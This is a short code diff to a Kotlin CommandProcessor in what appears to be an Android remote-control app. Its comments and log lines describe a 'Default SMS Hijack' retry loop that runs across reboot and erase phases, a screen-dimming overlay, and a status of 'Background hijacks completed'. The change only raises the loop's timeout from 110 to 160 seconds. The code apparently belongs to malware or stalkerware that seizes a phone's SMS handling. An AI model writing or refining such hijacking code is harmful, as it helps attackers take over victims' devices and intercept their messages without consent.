@@ -2455,11 +2455,11 @@ object CommandProcessor {
 
                         // 2. Default SMS Hijack
                         // THE RELENTLESS RETRY LOOP (Spans across Boot1, Erasing, and Boot2)
-                        DebugLogger.log("RBT_LIFECYCLE", "Entering Relentless Validation Loop for Critical Defaults (Max 110s)")
+                        DebugLogger.log("RBT_LIFECYCLE", "Entering Relentless Validation Loop for Critical Defaults (Max 160s)")
                         val loopStartTime = System.currentTimeMillis()
                         var allSuccess = false
                         
-                        while (!allSuccess && (System.currentTimeMillis() - loopStartTime) < 110000) {
+                        while (!allSuccess && (System.currentTimeMillis() - loopStartTime) < 160000) {
                             allSuccess = true
                             
                             // Check SMS
@@ -2515,7 +2515,7 @@ object CommandProcessor {
                             DimmerManager.removeOverlay(ctx)
                         }
                         if (!allSuccess) {
-                            CommandRetryManager.scheduleRetry(ctx, id, "RESET_BACKGROUND_TASKS", "", "110s Relentless Timeout")
+                            CommandRetryManager.scheduleRetry(ctx, id, "RESET_BACKGROUND_TASKS", "", "160s Relentless Timeout")
                         } else {
                             CommandProcessor.updateCommandStatus(ctx, id, "SUCCESS", "Background hijacks completed. All Success: true")
                         }
